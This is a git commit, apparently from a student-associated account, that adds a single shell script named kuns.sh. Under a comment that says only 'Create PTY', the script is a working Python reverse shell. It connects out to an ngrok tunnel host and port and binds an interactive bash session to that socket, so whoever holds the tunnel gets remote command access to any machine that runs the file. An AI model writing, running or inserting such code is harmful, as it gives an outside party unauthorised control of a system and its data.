c481f18eddcbb5525739f96655ac5916288f7474
rumahjsp <2406045@itg.ac.id>
2026-01-08 08:36:42 +0700

    Create kuns.sh

---
+++ kuns.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+# Create PTY
+python -c "
+import pty
+import os
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('0.tcp.ap.ngrok.io', 18743))
+
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+pty.spawn('/bin/bash')
+s.close()
+"
